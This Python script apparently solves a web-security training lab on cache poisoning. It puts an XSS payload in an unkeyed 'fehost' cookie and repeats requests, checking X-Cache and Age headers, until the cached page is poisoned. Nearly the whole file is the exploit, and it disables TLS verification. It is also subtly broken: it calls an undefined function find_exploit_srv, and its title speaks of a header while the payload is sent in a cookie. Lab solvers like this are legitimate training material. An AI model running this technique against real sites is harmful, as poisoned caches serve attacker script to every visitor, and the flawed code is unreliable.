# Web cache poisoning with an unkeyed header

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def send_sequence(s, url):
	exploit_body = 'gwyo"-alert(1)-"gwyo'
	cookies = {'fehost': exploit_body}
	cache_buster = url + '/?cb=1234'
	solved = False
	while solved == False:
		print('\n[+] Sending cache poisoning request...')
		r = s.get(cache_buster, cookies=cookies)
		time.sleep(2)
		if r.headers['X-cache'] == 'hit':
			r = s.get(url, cookies=cookies)
			if r.headers['X-Cache'] == "hit":
				print('[+] Cache poisoned')
				print('[+] Waiting %s seconds before retry...' % str(30 - int(r.headers['Age'])))
				time.sleep(30 - int(r.headers['Age']))
				r = s.get(url)
				if 'Congratulations, you solved the lab!' in r.text:
					print('\n[+] The lab is solved !')
					solved = True
					break
			else:
				print('[+] Received "X-cache: miss"...')
				time.sleep(2)

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Web cache poisoning with an unkeyed header')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		exploit_srv = find_exploit_srv(r)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to send Web Cache Poisoning attack...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			send_sequence(s, url)
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
